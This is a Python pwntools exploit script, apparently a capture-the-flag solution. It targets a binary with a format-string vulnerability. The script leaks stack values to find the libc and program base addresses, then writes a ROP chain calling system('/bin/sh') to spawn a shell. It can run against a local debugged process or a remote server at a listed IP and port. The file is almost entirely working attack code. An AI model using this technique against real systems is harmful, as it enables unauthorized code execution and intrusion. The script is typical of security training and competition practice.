from pwn import *
from icecream import ic

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

elf = ELF('main', checksec=0)

if True:
    p = gdb.debug(elf.path, aslr=False, gdbscript='\n'.join([
        # 'b*0x5555555551af',
        'c',
    ])) # type: tube
    # p = process(elf.path, aslr=False)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=0)
else: 
    p = remote('178.128.37.153', 32225)


def execute_fmt(payload: bytes):
    p.sendline(payload)
    return p.recvline()

fmt_str = FmtStr(execute_fmt, offset=6)

offset = fmt_str.find_offset()
ic(offset)

stack_array = []
for i in range(493):
    stacki = fmt_str.leak_stack(i, b'1337')
    stack_array.append(stacki)
    ic(i, hex(stacki))

top_of_stack = stack_array[2]
ic(hex(top_of_stack))
libc_address = stack_array[6] - (0x7ffff7ec9fd2 - 0x7ffff7dbc000)
ic(hex(libc_address))
libc.address = libc_address

elf_address = stack_array[492] - 0x40
ic(hex(elf_address))
elf.address = elf_address

rop1 = ROP([libc])
rop1.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
fmt_str.write(top_of_stack - 8, rop1.chain())

# fmt_str.write(top_of_stack - 8, libc.symbols['system'])
# fmt_str.write(top_of_stack, next(libc.search(b'/bin/sh\x00')))

fmt_str.execute_writes()

p.interactive()
